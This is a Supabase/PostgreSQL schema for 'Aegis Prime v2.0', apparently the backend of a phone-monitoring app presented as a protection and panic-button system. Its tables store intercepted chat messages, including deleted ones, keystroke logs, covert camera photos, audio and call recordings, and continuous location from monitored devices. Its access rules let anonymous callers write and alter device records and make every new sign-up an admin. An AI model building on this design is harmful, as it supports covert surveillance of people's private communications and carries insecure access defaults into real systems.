-- Aegis Prime v2.0 Database Schema
-- Security Level: Maximum

-- Enable PostGIS for location features if available (commented out as it might require extension installation privileges)
-- CREATE EXTENSION IF NOT EXISTS postgis;

-- 1. PROFILES & ROLES
CREATE TYPE user_role AS ENUM ('admin', 'security', 'protected');

CREATE TABLE public.profiles (
    id UUID REFERENCES auth.users(id) ON DELETE CASCADE PRIMARY KEY,
    full_name TEXT,
    role user_role DEFAULT 'protected',
    avatar_url TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 2. DEVICES
CREATE TABLE public.devices (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    user_id UUID REFERENCES public.profiles(id) ON DELETE CASCADE, -- Made nullable for initial pairing
    device_id TEXT NOT NULL UNIQUE, -- Hardware ID or Fingerprint
    model TEXT,
    os_version TEXT,
    battery_level INTEGER,
    signal_strength INTEGER, -- dBm or percentage
    is_online BOOLEAN DEFAULT false,
    last_seen TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()),
    fcm_token TEXT -- For push notifications
);

-- 3. LOCATION HISTORY (Realtime Tracking)
CREATE TABLE public.locations (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    latitude DOUBLE PRECISION NOT NULL,
    longitude DOUBLE PRECISION NOT NULL,
    accuracy DOUBLE PRECISION,
    speed DOUBLE PRECISION,
    heading DOUBLE PRECISION,
    altitude DOUBLE PRECISION,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Index for fast geospatial queries
CREATE INDEX idx_locations_device_time ON public.locations(device_id, timestamp DESC);

-- 4. COMMUNICATIONS (Messages & Keylogs)
CREATE TABLE public.intercepted_messages (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    app_package TEXT NOT NULL, -- e.g., com.whatsapp
    sender TEXT,
    recipient TEXT, -- Group name or contact
    content TEXT,
    is_deleted BOOLEAN DEFAULT false,
    captured_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

CREATE TABLE public.keylogs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    app_context TEXT, -- App where typing occurred
    content TEXT NOT NULL,
    captured_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 5. MEDIA & ENVIRONMENT (Camera & Mic)
CREATE TABLE public.captured_media (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    media_type TEXT CHECK (media_type IN ('photo_front', 'photo_back', 'video', 'audio', 'call_recording')),
    storage_path TEXT NOT NULL, -- Supabase Storage path
    trigger_event TEXT, -- e.g., 'manual', 'panic', 'keyword_trigger'
    captured_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- 6. ALERTS & INTELLIGENCE
CREATE TYPE alert_severity AS ENUM ('low', 'medium', 'high', 'critical');
CREATE TYPE alert_type AS ENUM ('geofence', 'biometric_anomaly', 'sim_swap', 'panic_button', 'low_battery', 'connection_lost');

CREATE TABLE public.alerts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    type alert_type NOT NULL,
    severity alert_severity NOT NULL,
    message TEXT NOT NULL,
    metadata JSONB, -- Extra details like location at time of alert
    is_resolved BOOLEAN DEFAULT false,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
    resolved_at TIMESTAMP WITH TIME ZONE
);

-- 7. PANIC PROTOCOL SESSIONS
CREATE TABLE public.panic_sessions (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
    start_time TIMESTAMP WITH TIME ZONE DEFAULT timezone('utc'::text, now()) NOT NULL,
    end_time TIMESTAMP WITH TIME ZONE,
    is_active BOOLEAN DEFAULT true,
    stream_url TEXT, -- Live stream URL
    initial_location_lat DOUBLE PRECISION,
    initial_location_lng DOUBLE PRECISION
);

-- 8. SECURITY POLICIES (RLS)
ALTER TABLE public.profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.intercepted_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.keylogs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_media ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.alerts ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.panic_sessions ENABLE ROW LEVEL SECURITY;

-- Policy: Security team/Admin can view everything.
-- IMPORTANT: We add a trigger to automatically make the first user an admin, 
-- or you can manually update the role in Supabase dashboard.

CREATE POLICY "Allow individual read own profile" ON public.profiles
    FOR SELECT USING (auth.uid() = id);

CREATE POLICY "Allow individual update own profile" ON public.profiles
    FOR UPDATE USING (auth.uid() = id);

CREATE POLICY "Security team can view all profiles" ON public.profiles
    FOR SELECT USING (
        EXISTS (
            SELECT 1 FROM public.profiles 
            WHERE id = auth.uid() AND role IN ('admin', 'security')
        )
    );

CREATE POLICY "Security team can view all devices" ON public.devices
    FOR SELECT USING (
        EXISTS (
            SELECT 1 FROM public.profiles 
            WHERE id = auth.uid() AND role IN ('admin', 'security')
        )
    );

CREATE POLICY "Devices can insert own record" ON public.devices
    FOR INSERT WITH CHECK (auth.role() = 'anon' OR auth.role() = 'authenticated');

CREATE POLICY "Devices can update own record" ON public.devices
    FOR UPDATE USING (auth.role() = 'anon' OR auth.role() = 'authenticated');

-- Allow devices (authenticated via API or Anon for now if testing) to insert data
-- Ideally, devices should authenticate with a service role or specific device credentials
-- For v2.0 prototype, we allow authenticated users (which the mobile app is) to insert
CREATE POLICY "Devices can insert location" ON public.locations
    FOR INSERT WITH CHECK (auth.role() = 'authenticated' OR auth.role() = 'anon');

CREATE POLICY "Devices can insert alerts" ON public.alerts
    FOR INSERT WITH CHECK (auth.role() = 'authenticated' OR auth.role() = 'anon');

-- Trigger to handle new user creation
CREATE OR REPLACE FUNCTION public.handle_new_user() 
RETURNS TRIGGER AS $$
BEGIN
  INSERT INTO public.profiles (id, full_name, role)
  VALUES (new.id, new.raw_user_meta_data->>'full_name', 'admin'); -- Defaulting to admin for the Owner
  RETURN new;
END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

CREATE TRIGGER on_auth_user_created
  AFTER INSERT ON auth.users
  FOR EACH ROW EXECUTE PROCEDURE public.handle_new_user();
